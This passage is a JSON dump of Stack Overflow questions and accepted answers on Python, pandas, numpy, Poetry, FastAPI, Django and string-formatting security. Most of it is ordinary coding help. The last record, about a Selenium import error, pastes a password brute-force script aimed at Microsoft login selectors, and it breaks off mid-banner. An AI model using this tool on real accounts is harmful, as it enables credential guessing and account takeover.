Vector{Bool}(undef, c+1)\n\n           for lN in 1:c+1\n               notseen .= true\n               @inbounds for i in 1:lN-1\n                   b = N[i] \u22bb N[lN-i]\n                   notseen[b+1] = false\n               end\n               idx = findfirst(notseen)\n               isnothing(idx) || (N[lN+1] = idx-1)\n           end\n           return count(==(0), N)\n       end\nproblem3 (generic function with 1 method)\n\njulia> @btime problem3(10000)\n  20.714 ms (3 allocations: 88.17 KiB)\n1475\n\n"
}
{
    "Id": 70739858,
    "PostTypeId": 1,
    "Title": "How to create a brand new virtual environment or duplicate an existing one in poetry? (Multiple environment in a project)",
    "Body": "I have a project and an existing virtual environment created with poetry (poetry install/init).\nSo, as far as I know, the purpouse of a virtual environment is avoiding to modify the system base environment and the possibility of isolation (per project, per development, per system etc...).\nHow can I create another brand new environment for my project in poetry? How can I eventually duplicate and use an existing one?\nI mean that the current one (activated) should be not involved in this (except for eventually copying it) because I want to test another set of dependencies and code.\nI am aware of this:\n\nhttps://github.com/python-poetry/poetry/issues/4055 (answer is not clear and ticket is not closed)\nhttps://python-poetry.org/docs/managing-environments/ (use command seems not to work in the requested way)\n\n",
    "AcceptedAnswerId": 70767511,
    "AcceptedAnswer": "Poetry seems to be bound to one virtualenv per python interpreter.\nPoetry is also bound to the pyproject.toml file and its path to generate a new environment.\nSo there are 2 tricky solutions:\n1 - change your deps in the pyproject.toml and use another python version (installed for example with pyenv) and then:\npoetry env use X.Y\n\npoetry will create a new virtual environment but this is not exactly the same as changing just some project deps.\n2 - use another pyproject.toml from another path:\nmkdir env_test\ncp pyproject.toml env_test/pyproject.toml\ncd env_test\nnano pyproject.toml # edit your dependencies\npoetry install # creates a brand new virtual environment\npoetry shell\n# run your script with the new environment\n\nThis will generate a new environment with just the asked dependencies changed. Both environments can be used at the same time.\nAfter the test, it is eventually possible to delete the new environment with the env command.\n"
}
{
    "Id": 70704285,
    "PostTypeId": 1,
    "Title": "Can no longer fold python dictionaries in VS Code",
    "Body": "I used to be able to collapse (fold) python dictionaries just fine in my VS Code.  Randomly I am not able to do that anymore.  I can still fold classes and functions just fine, but dictionaries cannot fold, the arrow on the left hand side just isn't there.  I've checked my settings but I can't figure out what would've changed.  I'm not sure the best forum to go to for help, so I'm hoping this is ok.  Any ideas?\n",
    "AcceptedAnswerId": 70714478,
    "AcceptedAnswer": "It's caused by Pylance v2022.1.1. Use v2022.1.0 instead.\nIssue #2248\n"
}
{
    "Id": 71198478,
    "PostTypeId": 1,
    "Title": "Counting all combinations of values in multiple columns",
    "Body": "The following is an example of items rated by 1,2 or 3 stars.\nI am trying to count all combinations of item ratings (stars) per month.\nIn the following example, item 10 was rated in month 1 and has two ratings equal 1, one rating equal 2 and one rating equal 3.\ninp = pd.DataFrame({'month':[1,1,1,1,1,2,2,2], \n                    'item':[10,10,10,10,20,20,20,20], \n                    'star':[1,2,1,3,3,2,2,3]}\n                  )\n\n month item star\n0   1   10  1\n1   1   10  2\n2   1   10  1\n3   1   10  3\n4   1   20  3\n5   2   20  2\n6   2   20  2\n7   2   20  3\n\nFor the given above input frame output should be:\n   month    item    star_1_cnt  star_2_cnt  star_3_cnt\n0   1       10      2           1           1\n1   1       20      0           0           1\n2   2       20      0           2           1\n\nI am trying to solve the problem starting with the following code,\nwhich result still needs to be converted to the desired format of the output frame and which gives the wrong answers:\n1   20  3   (1, 1)\n2   20  3   (1, 1)\n\nAnyway, there should be a better way to create the output table, then finalizing this one:\nmonths = [1,2]\nitems = [10,20]\nstars = [1,2,3]\n\nd = {'month': [], 'item': [], 'star': [], 'star_cnts': [] }\n\nfor month in months:\n    for star in stars:\n        for item in items:\n            star_cnts=dict(inp[(inp['item']==item) & (inp['star']==star)].value_counts()).values()\n            d['month'].append(month)\n            d['item'].append(item)\n            d['star'].append(star)\n            d['star_cnts'].append(star_cnts)\n            \npd.DataFrame(d)\n\n    month   item    star    star_cnts\n0   1       10      1       (2)\n1   1       20      1       ()\n2   1       10      2       (1)\n3   1       20      2       (2)\n4   1       10      3       (1)\n5   1       20      3       (1, 1)\n6   2       10      1       (2)\n7   2       20      1       ()\n8   2       10      2       (1)\n9   2       20      2       (2)\n10  2       10      3       (1)\n11  2       20      3       (1, 1)\n\n\u200b\n",
    "AcceptedAnswerId": 71209097,
    "AcceptedAnswer": "This seems like a nice problem for pd.get_dummies:\nnew_df = (\n    pd.concat([df, pd.get_dummies(df['star'])], axis=1)\n    .groupby(['month', 'item'], as_index=False)\n    [df['star'].unique()]\n    .sum()\n)\n\nOutput:\n>>> new_df\n   month  item  1  2  3\n0      1    10  2  1  1\n1      1    20  0  0  1\n2      2    20  0  2  1\n\nRenaming, too:\nu = df['star'].unique()\nnew_df = (\n    pd.concat([df, pd.get_dummies(df['star'])], axis=1)\n    .groupby(['month', 'item'], as_index=False)\n    [u]\n    .sum()\n    .rename({k: f'star_{k}_cnt' for k in df['star'].unique()}, axis=1)\n)\n\nOutput:\n>>> new_df\n   month  item  star_1_cnt  star_2_cnt  star_3_cnt\n0      1    10           2           1           1\n1      1    20           0           0           1\n2      2    20           0           2           1\n\nObligatory one- (or two-) liners:\n# Renames the columns\nu = df['star'].unique()\nnew_df = pd.concat([df, pd.get_dummies(df['star'])], axis=1).groupby(['month', 'item'], as_index=False)[u].sum().rename({k: f'star_{k}_cnt' for k in df['star'].unique()}, axis=1)\n\n"
}
{
    "Id": 70598913,
    "PostTypeId": 1,
    "Title": "Problem resizing plot on tkinter figure canvas",
    "Body": "Python 3.9 on Mac running OS 11.6.1. My application involves placing a plot on a frame inside my root window, and I'm struggling to get the plot to take up a larger portion of the window. I thought rcParams in matplotlib.pyplot would take care of this, but I must be overlooking something.\nHere's what I have so far:\nimport numpy as np\nfrom tkinter import Tk,Frame,TOP,BOTH\n\nimport matplotlib\nfrom matplotlib import pyplot as plt\nfrom matplotlib.backends.backend_tkagg import FigureCanvasTkAgg\n\nplt.rcParams[\"figure.figsize\"] = [18,10]\n\nroot=Tk()\nroot.wm_title(\"Root Window\")\nroot.geometry('1500x1000')\n\nx = np.linspace(0, 2 * np.pi, 400)\ny = np.sin(x ** 2)\nfig, ax = plt.subplots()\nax.plot(x, y)\n\ncanvas_frame=Frame(root) # also tried adjusting size of frame but that didn't help\ncanvas_frame.pack(side=TOP,expand=True)\ncanvas = FigureCanvasTkAgg(fig, master=canvas_frame)\ncanvas.draw()\ncanvas.get_tk_widget().pack(side=TOP,fill=BOTH,expand=True)\n\n\nroot.mainloop()\n\nFor my actual application, I need for canvas to have a frame as its parent and not simply root, which is why canvas_frame is introduced above.\n",
    "AcceptedAnswerId": 70717588,
    "AcceptedAnswer": "try something like this:\nfig.subplots_adjust(left=0.05, bottom=0.07, right=0.95, top=0.95, wspace=0, hspace=0)\n\nthis is output, figure now takes more screen area %\n[\n"
}
{
    "Id": 71225952,
    "PostTypeId": 1,
    "Title": "Try each function of a class with functools.wraps decorator",
    "Body": "I'm trying to define a decorator in order to execute a class method, try it first and, if an error is detected, raise it mentioning the method in which failed, so as to the user could see in which method is the error.\nHere I show a MRE (Minimal, Reproducible Example) of my code.\nfrom functools import wraps\n\ndef trier(func):\n    \"\"\"Decorator for trying A-class methods\"\"\"\n    @wraps(func)\n    def inner_func(self, name, *args):\n        \n        try:\n            func(self, *args)\n        \n        except:\n            print(f\"An error apeared while {name}\")\n    \n    return inner_func\n    \nclass A:\n    def __init__(self):\n        self._animals = 2\n        self._humans = 5\n    \n    @trier('getting animals')\n    def animals(self, num):\n        return self._animals + num\n    \n    @trier('getting humans')\n    def humans(self):\n        return self._humans\n\nA().animals\n\nMany errors are raising, like:\n\nTypeError: inner_func() missing 1 required positional argument: 'name'\n\nor misunderstanding self class with self function.\n",
    "AcceptedAnswerId": 71226219,
    "AcceptedAnswer": "As an alternative to Stefan's answer, the following simply uses @trier without any parameters to decorate functions, and then when printing out the error message we can get the name with func.__name__.\nfrom functools import wraps\n\ndef trier(func):\n    \"\"\"Decorator for trying A-class methods\"\"\"\n    @wraps(func)\n    def inner_func(self, *args, **kwargs):\n\n        try:\n            return func(self, *args, **kwargs)\n\n        except:\n            print(f\"An error apeared in {func.__name__}\")\n\n    return inner_func\n\nclass A:\n    def __init__(self):\n        self._animals = 2\n        self._humans = 5\n\n    @trier\n    def animals(self, num):\n        return self._animals + num\n\n    @trier\n    def humans(self):\n        return self._humans\n\nprint(A().animals(1))\n\nI also fixed a couple of bugs in the code: In trier's try and except the result of calling func was never returned, and you need to include **kwargs in addition to *args so you can use named parameters. I.e. A().animals(num=1) only works when you handle kwargs.\n"
}
{
    "Id": 71225872,
    "PostTypeId": 1,
    "Title": "Why does numpy.view(bool) makes numpy.logical_and significantly faster?",
    "Body": "When passing a numpy.ndarray of uint8 to numpy.logical_and, it runs significantly faster if I apply numpy.view(bool) to its inputs.\na = np.random.randint(0, 255, 1000 * 1000 * 100, dtype=np.uint8)\nb = np.random.randint(0, 255, 1000 * 1000 * 100, dtype=np.uint8)\n\n%timeit np.logical_and(a, b)\n126 ms \u00b1 1.17 ms per loop (mean \u00b1 std. dev. of 7 runs, 10 loops each)\n\n%timeit np.logical_and(a.view(bool), b.view(bool))\n20.9 ms \u00b1 110 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 10 loops each)\n\nCan someone explain why this is happening?\nFurthermore, why numpy.logical_and doesn't automatically apply view(bool) to an array of uint8? (Is there any situation where we shouldn't use view(bool)?)\nEDIT:\nIt seems that this is an issue with Windows environment.\nI just tried the same thing in the official python docker container (which is debian) and found no difference between them.\nMy environment:\n\nOS: Windows 10 Pro 21H2\nCPU: AMD Ryzen 9 5900X\nPython: Python 3.10.2 (tags/v3.10.2:a58ebcc, Jan 17 2022, 14:12:15) [MSC v.1929 64 bit (AMD64)] on win32\nnumpy: 1.22.2\n\n",
    "AcceptedAnswerId": 71227844,
    "AcceptedAnswer": "This is a performance issue of the current Numpy implementation. I can also reproduce this problem on Windows (using an Intel Skylake Xeon processor with Numpy 1.20.3). np.logical_and(a, b) executes a very-inefficient scalar assembly code based on slow conditional jumps while np.logical_and(a.view(bool), b.view(bool)) executes relatively-fast SIMD instructions.\nCurrently, Numpy uses a specific implementation for bool-types. Regarding the compiler used, the general-purpose implementation can be significantly slower if the compiler used to build Numpy failed to automatically vectorize the code which is apparently the case on Windows (and explain why this is not the case on other platforms since the compiler is likely not exactly the same). The Numpy code can be improved for non-bool types. Note that the vectorization of Numpy is an ongoing work and we plan optimize this soon.\n\nDeeper analysis\nHere is the assembly code executed by np.logical_and(a, b):\nBlock 24:                         \n    cmp byte ptr [r8], 0x0        ; Read a[i]\n    jz                  ; Jump to block 27 if a[i]!=0\nBlock 25:                         \n    cmp byte ptr [r9], 0x0        ; Read b[i]\n    jz                  ; Jump to block 27 if b[i]!=0\nBlock 26:                         \n    mov al, 0x1                   ; al = 1\n    jmp                 ; Skip the next instruction\nBlock 27:                         \n    xor al, al                    ; al = 0\nBlock 28:                         \n    mov byte ptr [rdx], al        ; result[i] = al\n    inc r8                        ; i += 1\n    inc rdx                       \n    inc r9                        \n    sub rcx, 0x1                  \n    jnz                 ; Loop again while i<a.shape[0]\n\nAs you can see, the loop use several data-dependent conditional jumps to write per item of a and b read. This is very inefficient here since the branch taken cannot be predicted by the processor with random values. As a result the processor stall for few cycles (typically about 10 cycles on modern x86 processors).\nHere is the assembly code executed by np.logical_and(a.view(bool), b.view(bool)):\nBlock 15:\n    movdqu xmm1, xmmword ptr [r10]               ; xmm1 = a[i:i+16]\n    movdqu xmm0, xmmword ptr [rbx+r10*1]         ; xmm0 = b[i:i+16]\n    lea r10, ptr [r10+0x10]                      ; i += 16\n    pcmpeqb xmm1, xmm2                           ; \\\n    pandn xmm1, xmm0                             ;  | Complex sequence to just do:\n    pcmpeqb xmm1, xmm2                           ;  | xmm1 &= xmm0\n    pandn xmm1, xmm3                             ; /\n    movdqu xmmword ptr [r14+r10*1-0x10], xmm1    ; result[i:i+16] = xmm1\n    sub rcx, 0x1                                 \n    jnz                                ; Loop again while i!=a.shape[0]//16\n\nThis code use the SIMD instruction set called SSE which is able to work on 128-bit wide registers. There is no conditional jumps. This code is far more efficient as it operates on 16 items at once per iteration and each iteration should be much faster.\nNote that this last code is not optimal either as most modern x86 processors (like your AMD one) supports the 256-bit AVX-2 instruction set (twice as fast). Moreover, the compiler generate an inefficient sequence of SIMD instruction to perform the logical-and that can be optimized. The compiler seems to assume the boolean can be values different of 0 or 1. That being said, the input arrays are too big to fit in your CPU cache and so the code is bounded by the throughput of your RAM as opposed to the first one. This is why the SIMD-friendly code is not drastically faster. The difference between the two version is certainly much bigger with arrays of less than 1 MiB on your processor (like on almost all other modern processor).\n"
}
{
    "Id": 70751249,
    "PostTypeId": 1,
    "Title": "Which are safe methods and practices for string formatting with user input in Python 3?",
    "Body": "My Understanding\nFrom various sources, I have come to the understanding that there are four main techniques of string formatting/interpolation in Python 3 (3.6+ for f-strings):\n\nFormatting with %, which is similar to C's printf\nThe str.format() method\nFormatted string literals/f-strings\nTemplate strings from the standard library string module\n\nMy knowledge of usage mainly comes from Python String Formatting Best Practices (source A):\n\nstr.format() was created as a better alternative to the %-style, so the latter is now obsolete\n\nHowever, str.format() is vulnerable to attacks if user-given format strings are not properly handled\n\n\nf-strings allow str.format()-like behavior only for string literals but are shorter to write and are actually somewhat-optimized syntactic sugar for concatenation\nTemplate strings are safer than str.format() (demonstrated in the first source) and the other two methods (implied in the first source) when dealing with user input\n\nI understand that the aforementioned vulnerability in str.format() comes from the method being usable on any normal strings where the delimiting braces are part of the string data itself. Malicious user input containing brace-delimited replacement fields can be supplied to the method to access environment attributes. I believe this is unlike the other ways of formatting where the programmer is the only one that can supply variables to the pre-formatted string. For example, f-strings have similar syntax to str.format() but, because f-strings are literals and the inserted values are evaluated separately through concatenation-like behavior, they are not vulnerable to the same attack (source B). Both %-formatting and Template strings also seem to only be supplied variables for substitution by the programmer; the main difference pointed out is Template's more limited functionality.\nMy Confusion\nI have seen a lot of emphasis on the vulnerability of str.format() which leaves me with questions of what I should be wary of when using the other techniques. Source A describes Template strings as the safest of the above methods \"due to their reduced complexity\":\n\nThe more complex formatting mini-languages of the other string formatting techniques might introduce security vulnerabilities to your programs.\n\n\nYes, it seems like f-strings are not vulnerable in the same way str.format() is, but are there known concerns about f-string security as is implied by source A? Is the concern more like risk mitigation for unknown exploits and unintended interactions?\n\nI am not familiar with C and I don't plan on using the clunkier %/printf-style formatting, but I have heard that C's printf had its own potential vulnerabilities. In addition, both sources A and B seem to imply a lack of security with this method. The top answer in Source B says,\n\nString formatting may be dangerous when a format string depends on untrusted data. So, when using str.format() or %-formatting, it's important to use static format strings, or to sanitize untrusted parts before applying the formatter function.\n\n\nDo %-style strings have known security concerns?\nLastly, which methods should be used and how can user input-based attacks be prevented (e.g. filtering input with regex)?\n\nMore specifically, are Template strings really the safer option? and Can f-strings be used just as easily and safely while granting more functionality?\n\n\n\n",
    "AcceptedAnswerId": 70755916,
    "AcceptedAnswer": "It doesn't matter which format you choose, any format and library can have its own downsides and vulnerabilities. The bigger questions you need to ask yourself is what is the risk factor and the scenario you are facing with, and what are you going to do about it.\nFirst ask yourself: will there be a scenario where a user or an external entity of some kind (for example - an external system) sends you a format string? If the answer is no, there is no risk. If the answer is yes, you need to see whether this is needed or not. If not - remove it to eliminate the risk.\nIf you need it - you can perform whitelist-based input validation and exclude all format-specific special characters from the list of permitted characters, in order to eliminate the risk. For example, no format string can pass the ^[a-zA-Z0-9\\s]*$ generic regular expression.\nSo the bottom line is: it doesn't matter which format string type you use, what's really important is what do you do with it and how can you reduce and eliminate the risk of it being tampered.\n"
}
{
    "Id": 70773526,
    "PostTypeId": 1,
    "Title": "Why do we need a dict.update() method in python instead of just assigning the values to the corresponding keys?",
    "Body": "I have been working with dictionaries that I have to modify within different parts of my code. I am trying to make sure if I do not miss anything about there is no need for dict_update() in any scenario.\nSo the reasons to use update() method is either to add a new key-value pair to current dictionary, or update the value of your existing ones.\nBut wait!?\nAren't they already possible by just doing:\n>>>test_dict = {'1':11,'2':1445}\n>>>test_dict['1'] = 645\n>>>test_dict\n{'1': 645, '2': 1445}\n>>>test_dict[5]=123\n>>>test_dict\n{'1': 645, '2': 1445, 5: 123}\n\nIn what case it would be crucial to use it ? I am curious.\nMany thanks\n",
    "AcceptedAnswerId": 70773868,
    "AcceptedAnswer": "1. You can update many keys on the same statement.\nmy_dict.update(other_dict)\n\nIn this case you don't have to know how many keys are in the other_dict. You'll just be sure that all of them will be updated on my_dict.\n2. You can use any iterable of key/value pairs with dict.update\nAs per the documentation you can use another dictionary, kwargs, list of tuples, or even generators that yield tuples of len 2.\n3. You can use the update method as an argument for functions that expect a function argument.\nExample:\ndef update_value(key, value, update_function):\n    update_function([(key, value)])\n\nupdate_value(\"k\", 3, update_on_the_db)  # suppose you have a update_on_the_db function\nupdate_value(\"k\", 3, my_dict.update)  # this will update on the dict\n\n"
}
{
    "Id": 71238822,
    "PostTypeId": 1,
    "Title": "Why is setuptools not available in environment Ubuntu docker image with Python & dev tools installed?",
    "Body": "I'm trying to build a Ubuntu 18.04 Docker image running Python 3.7 for a machine learning project. When installing specific Python packages with pip from requirements.txt, I get the following error:\nCollecting sklearn==0.0\n  Downloading sklearn-0.0.tar.gz (1.1 kB)\n  Preparing metadata (setup.py): started\n  Preparing metadata (setup.py): finished with status 'error'\n  error: subprocess-exited-with-error\n  \n  \u00d7 python setup.py egg_info did not run successfully.\n  \u2502 exit code: 1\n  \u2570\u2500> [1 lines of output]\n      ERROR: Can not execute `setup.py` since setuptools is not available in the build environment.\n      [end of output]\n\nAlthough here the error arises in the context of sklearn, the issue is not specific to one library; when I remove that libraries and try to rebuild the image, the error arises with other libraries.\nHere is my Dockerfile:\nFROM ubuntu:18.04\n\n# install python\nRUN apt-get update && \\\n    apt-get install --no-install-recommends -y \\\n    python3.7 python3-pip python3.7-dev\n\n# copy requirements\nWORKDIR /opt/program\nCOPY requirements.txt requirements.txt\n\n# install requirements\nRUN python3.7 -m pip install --upgrade pip && \\\n    python3.7 -m pip install -r requirements.txt\n\n# set up program in image\nCOPY . /opt/program\n\nWhat I've tried:\n\ninstalling python-devtools, both instead of and alongside, python3.7-dev before installing requirements with pip;\ninstalling setuptools in requirements.txt before affected libraries are installed.\n\nIn both cases the same error arose.\nDo you know how I can ensure setuptools is available in my environment when installing libraries like sklearn?\n",
    "AcceptedAnswerId": 71239956,
    "AcceptedAnswer": "As mentioned in comment, install setuptools with pip before running pip install -r requirements.txt.\nIt is different than putting setuptools higher in the requirements.txt because it forces the order while the requirements file collect all the packages and installs them after so you don't control the order.\n"
}
{
    "Id": 70658151,
    "PostTypeId": 1,
    "Title": "How to log production database changes made via the Django shell",
    "Body": "I would like to automatically generate some sort of log of all the database changes that are made via the Django shell in the production environment.\nWe use schema and data migration scripts to alter the production database and they are version controlled. Therefore if we introduce a bug, it's easy to track it back. But if a developer in the team changes the database via the Django shell which then introduces an issue, at the moment we can only hope that they remember what they did or/and we can find their commands in the Python shell history.\nExample. Let's imagine that the following code was executed by a developer in the team via the Python shell:\n>>> tm = TeamMembership.objects.get(person=alice)\n>>> tm.end_date = date(2022,1,1)\n>>> tm.save()\n\nIt changes a team membership object in the database. I would like to log this somehow.\nI'm aware that there are a bunch of Django packages related to audit logging, but I'm only interested in the changes that are triggered from the Django shell, and I want to log the Python code that updated the data.\nSo the questions I have in mind:\n\nI can log the statements from IPython but how do I know which one touched the database?\nI can listen to the pre_save signal for all model to know if data changes, but how do I know if the source was from the Python shell? How do I know what was the original Python statement?\n\n",
    "AcceptedAnswerId": 70791300,
    "AcceptedAnswer": "This solution logs all commands in the session if any database changes were made.\nHow to detect database changes\nWrap execute_sql of SQLInsertCompiler, SQLUpdateCompiler and SQLDeleteCompiler.\nSQLDeleteCompiler.execute_sql returns a cursor wrapper.\nfrom django.db.models.sql.compiler import SQLInsertCompiler, SQLUpdateCompiler, SQLDeleteCompiler\n\nchanged = False\n\ndef check_changed(func):\n    def _func(*args, **kwargs):\n        nonlocal changed\n        result = func(*args, **kwargs)\n        if not changed and result:\n            changed = not hasattr(result, 'cursor') or bool(result.cursor.rowcount)\n        return result\n    return _func\n\nSQLInsertCompiler.execute_sql = check_changed(SQLInsertCompiler.execute_sql)\nSQLUpdateCompiler.execute_sql = check_changed(SQLUpdateCompiler.execute_sql)\nSQLDeleteCompiler.execute_sql = check_changed(SQLDeleteCompiler.execute_sql)\n\nHow to log commands made via the Django shell\natexit.register() an exit handler that does readline.write_history_file().\nimport atexit\nimport readline\n\ndef exit_handler():\n    filename = 'history.py'\n    readline.write_history_file(filename)\n\natexit.register(exit_handler)\n\nIPython\nCheck whether IPython was used by comparing HistoryAccessor.get_last_session_id().\nimport atexit\nimport io\nimport readline\n\nipython_last_session_id = None\ntry:\n    from IPython.core.history import HistoryAccessor\nexcept ImportError:\n    pass\nelse:\n    ha = HistoryAccessor()\n    ipython_last_session_id = ha.get_last_session_id()\n\ndef exit_handler():\n    filename = 'history.py'\n    if ipython_last_session_id and ipython_last_session_id != ha.get_last_session_id():\n        cmds = '\\n'.join(cmd for _, _, cmd in ha.get_range(ha.get_last_session_id()))\n        with io.open(filename, 'a', encoding='utf-8') as f:\n            f.write(cmds)\n            f.write('\\n')\n    else:\n        readline.write_history_file(filename)\n\natexit.register(exit_handler)\n\nPut it all together\nAdd the following in manage.py before execute_from_command_line(sys.argv).\nif sys.argv[1] == 'shell':\n    import atexit\n    import io\n    import readline\n\n    from django.db.models.sql.compiler import SQLInsertCompiler, SQLUpdateCompiler, SQLDeleteCompiler\n\n    changed = False\n\n    def check_changed(func):\n        def _func(*args, **kwargs):\n            nonlocal changed\n            result = func(*args, **kwargs)\n            if not changed and result:\n                changed = not hasattr(result, 'cursor') or bool(result.cursor.rowcount)\n            return result\n        return _func\n\n    SQLInsertCompiler.execute_sql = check_changed(SQLInsertCompiler.execute_sql)\n    SQLUpdateCompiler.execute_sql = check_changed(SQLUpdateCompiler.execute_sql)\n    SQLDeleteCompiler.execute_sql = check_changed(SQLDeleteCompiler.execute_sql)\n\n    ipython_last_session_id = None\n    try:\n        from IPython.core.history import HistoryAccessor\n    except ImportError:\n        pass\n    else:\n        ha = HistoryAccessor()\n        ipython_last_session_id = ha.get_last_session_id()\n\n    def exit_handler():\n        if changed:\n            filename = 'history.py'\n            if ipython_last_session_id and ipython_last_session_id != ha.get_last_session_id():\n                cmds = '\\n'.join(cmd for _, _, cmd in ha.get_range(ha.get_last_session_id()))\n                with io.open(filename, 'a', encoding='utf-8') as f:\n                    f.write(cmds)\n                    f.write('\\n')\n            else:\n                readline.write_history_file(filename)\n\n    atexit.register(exit_handler)\n\n"
}
{
    "Id": 70773879,
    "PostTypeId": 1,
    "Title": "fastapi (starlette) RedirectResponse redirect to post instead get method",
    "Body": "I have encountered strange redirect behaviour after returning a RedirectResponse object\nevents.py\nrouter = APIRouter()\n\n@router.post('/create', response_model=EventBase)\nasync def event_create(\n        request: Request,\n        user_id: str = Depends(get_current_user),\n        service: EventsService = Depends(),\n        form: EventForm = Depends(EventForm.as_form)\n):\n    event = await service.post(\n       ...\n   )\n    redirect_url = request.url_for('get_event', **{'pk': event['id']})\n    return RedirectResponse(redirect_url)\n\n\n@router.get('/{pk}', response_model=EventSingle)\nasync def get_event(\n        request: Request,\n        pk: int,\n        service: EventsService = Depends()\n):\n    ....some logic....\n    return templates.TemplateResponse(\n        'event.html',\n        context=\n        {\n            ...\n        }\n    )\n\nrouters.py\napi_router = APIRouter()\n\n...\napi_router.include_router(events.router, prefix=\"/event\")\n\nthis code returns the result\n127.0.0.1:37772 - \"POST /event/22 HTTP/1.1\" 405 Method Not Allowed\n\nOK, I see that for some reason a POST request is called instead of a GET request. I search for an explanation and find that the RedirectResponse object defaults to code 307 and calls POST link\nI follow the advice and add a status\nredirect_url = request.url_for('get_event', **{'pk': event['id']}, status_code=status.HTTP_302_FOUND)\n\nAnd get\nstarlette.routing.NoMatchFound\n\nfor the experiment, I'm changing @router.get('/{pk}', response_model=EventSingle) to @router.post('/{pk}', response_model=EventSingle)\nand the redirect completes successfully, but the post request doesn't suit me here. What am I doing wrong?\nUPD\nhtml form for running event/create logic\nbase.html\n\n...\n\n\nbase_view.py\n@router.get('/', response_class=HTMLResponse)\nasync def main_page(request: Request,\n                    activity_service: ActivityService = Depends()):\n    activity = await activity_service.get()\n    return templates.TemplateResponse('base.html', context={'request': request,\n                                                            'activities': activity})\n\n",
    "AcceptedAnswerId": 70774192,
    "AcceptedAnswer": "When you want to redirect to a GET after a POST, the best practice is to redirect with a 303 status code, so just update your code to:\n    # ...\n    return RedirectResponse(redirect_url, status_code=303)\n\nAs you've noticed, redirecting with 307 keeps the HTTP method and body.\nFully working example:\nfrom fastapi import FastAPI, APIRouter, Request\nfrom fastapi.responses import RedirectResponse, HTMLResponse\n\n\nrouter = APIRouter()\n\n@router.get('/form')\ndef form():\n    return HTMLResponse(\"\"\"\n    \n    \n    Send request\n    \n    \n    \"\"\")\n\n@router.post('/create')\nasync def event_create(\n        request: Request\n):\n    event = {\"id\": 123}\n    redirect_url = request.url_for('get_event', **{'pk': event['id']})\n    return RedirectResponse(redirect_url, status_code=303)\n\n\n@router.get('/{pk}')\nasync def get_event(\n        request: Request,\n        pk: int,\n):\n    return f'oi pk={pk}'\n\napp = FastAPI(title='Test API')\n\napp.include_router(router, prefix=\"/event\")\n\nTo run, install pip install fastapi uvicorn and run with:\nuvicorn --reload --host 0.0.0.0 --port 3000 example:app\n\nThen, point your browser to: http://localhost:3000/event/form\n"
}
{
    "Id": 71324949,
    "PostTypeId": 1,
    "Title": "Import \"selenium\" could not be resolved Pylance (reportMissingImports)",
    "Body": "I am editing a file in VS code. VS code gives the following error: Import \"selenium\" could not be resolved Pylance (reportMissingImports).\nThis is the code from metachar:\n# Coded and based by METACHAR/Edited and modified for Microsoft by Major\nimport sys\nimport datetime\nimport selenium\nimport requests\nimport time as t\nfrom sys import stdout\nfrom selenium import webdriver\nfrom optparse import OptionParser\nfrom selenium.webdriver.common.keys import Keys\nfrom selenium.common.exceptions import NoSuchElementException\n\n# Graphics\nclass color:\n   PURPLE = '\\033[95m'\n   CYAN = '\\033[96m'\n   DARKCYAN = '\\033[36m'\n   BLUE = '\\033[94m'\n   GREEN = '\\033[92m'\n   YELLOW = '\\033[93m'\n   RED = '\\033[91m'\n   BOLD = '\\033[1m'\n   UNDERLINE = '\\033[4m'\n   END = '\\033[0m'\n   CWHITE  = '\\33[37m'\n\n# Config#\nparser = OptionParser()\nnow = datetime.datetime.now()\n\n# Args\nparser.add_option(\"--passsel\", dest=\"passsel\",help=\"Choose the password selector\")\nparser.add_option(\"--loginsel\", dest=\"loginsel\",help= \"Choose the login button selector\")\nparser.add_option(\"--passlist\", dest=\"passlist\",help=\"Enter the password list directory\")\nparser.add_option(\"--website\", dest=\"website\",help=\"choose a website\")\n(options, args) = parser.parse_args()\n\nCHROME_DVR_DIR = '/home/major/Hatch/chromedriver'\n\n# Setting up Brute-Force function\ndef wizard():\n    print (banner)\n    website = raw_input(color.GREEN + color.BOLD + '\\n[~] ' + color.CWHITE + 'Enter a website: ')\n    sys.stdout.write(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists '),\n    sys.stdout.flush()\n    t.sleep(1)\n    try:\n        request = requests.get(website)\n        if request.status_code == 200:\n            print (color.GREEN + '[OK]'+color.CWHITE)\n            sys.stdout.flush()\n    except selenium.common.exceptions.NoSuchElementException:\n        pass\n    except KeyboardInterrupt:\n        print (color.RED + '[!]'+color.CWHITE+ 'User used Ctrl-c to exit')\n        exit()\n    except:\n        t.sleep(1)\n        print (color.RED + '[X]'+color.CWHITE)\n        t.sleep(1)\n        print (color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https')\n        exit()\n    password_selector = '#i0118'\n    login_btn_selector = '#idSIButton9'\n    pass_list = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')\n    brutes(password_selector,login_btn_selector,pass_list, website)\n\n# Execute Brute-Force function\ndef brutes(password_selector,login_btn_selector,pass_list, website):\n    f = open(pass_list, 'r')\n    driver = webdriver.Chrome(CHROME_DVR_DIR)\n    optionss = webdriver.ChromeOptions()\n    optionss.add_argument(\"--disable-popup-blocking\")\n    optionss.add_argument(\"--disable-extensions\")\n    count = 1\n    browser = webdriver.Chrome(CHROME_DVR_DIR)\n    while True:\n        try:\n            for line in f:\n                browser.get(website)\n                t.sleep(1)\n                Sel_pas = browser.find_element_by_css_selector(password_selector)\n                enter = browser.find_element_by_css_selector(login_btn_selector) \n                Sel_pas.send_keys(line)\n                t.sleep(2)\n                print ('------------------------')\n                print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN)\n                print ('------------------------')\n                temp = line \n        except KeyboardInterrupt: \n            exit()\n        except selenium.common.exceptions.NoSuchElementException:\n            print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')\n            print ('LAST PASS ATTEMPT BELLOW')\n            print (color.GREEN + 'Password has been found: {0}'.format(temp))\n            print (color.YELLOW + 'Have fun :)')\n            exit()\n\nbanner = color.BOLD + color.RED +'''\n  _    _       _       _\n | |  | |     | |     | |\n | |__| | __ _| |_ ___| |__ \n |  __  |/ _` | __/ __| '_ \\\\\n | |  | | (_| | || (__| | | |\n |_|  |_|\\__,_|\\__\\___|_| |_|\n  {0}[{1}-{2}]--> {3}V.1.0\n  {4}[{5}-{6}]--> {7}coded by Metachar\n  {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, 